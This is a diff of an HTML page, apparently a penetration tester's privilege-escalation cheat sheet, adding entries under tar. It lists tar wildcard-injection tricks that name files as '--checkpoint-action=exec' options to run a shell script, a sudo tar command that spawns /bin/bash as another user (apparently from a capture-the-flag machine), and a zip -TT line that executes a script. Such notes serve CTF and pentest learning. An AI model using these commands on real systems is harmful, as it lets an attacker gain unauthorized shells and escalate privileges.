@@ -49,7 +49,11 @@ tar<br/>
 <li style="list-style-type: none">if you cannot edit the tar command, you can create files on the system for wildcard injection</li>
 <li style="list-style-type: none">touch "-checkpoint-action=exec=sh rshell.sh"</li>
 <li style="list-style-type: none">touch "-checkpoint=1"</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none">sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</li>
 </ul>
+<br/>
+<br/>
 zip<br/>
 &nbsp;&#09;zip z.zip a -T -TT ./runme.sh<br/>
 ftp<br/>
